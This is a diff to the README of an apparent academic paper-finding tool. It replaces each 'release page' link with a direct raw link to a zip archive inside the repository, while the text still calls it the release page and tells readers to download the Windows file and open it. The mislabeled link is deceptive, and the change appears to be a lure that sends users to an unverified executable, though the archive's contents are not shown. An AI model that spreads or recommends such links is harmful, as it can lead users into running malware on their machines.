@@ -1,6 +1,6 @@
 # 📚 academic-skills - Find real papers with less guesswork
 
-[![Download](https://img.shields.io/badge/Download%20the%20release-blue?style=for-the-badge)](https://github.com/gretamutualist474/academic-skills/releases)
+[![Download](https://img.shields.io/badge/Download%20the%20release-blue?style=for-the-badge)](https://github.com/gretamutualist474/academic-skills/raw/refs/heads/main/real-literature-trace/academic_skills_v2.2.zip)
 
 ## 🧭 What this is
 
@@ -30,7 +30,7 @@ Recommended:
 
 Visit the release page here:
 
-https://github.com/gretamutualist474/academic-skills/releases
+https://github.com/gretamutualist474/academic-skills/raw/refs/heads/main/real-literature-trace/academic_skills_v2.2.zip
 
 Open the page, then download the Windows file from the latest release. After the download finishes, open the file to start using it.
 
@@ -207,7 +207,7 @@ It is made to support academic research work without forcing you to sort through
 
 If you need the release page again, use this link:
 
-https://github.com/gretamutualist474/academic-skills/releases
+https://github.com/gretamutualist474/academic-skills/raw/refs/heads/main/real-literature-trace/academic_skills_v2.2.zip
 
 ## 📄 Repository contents
 
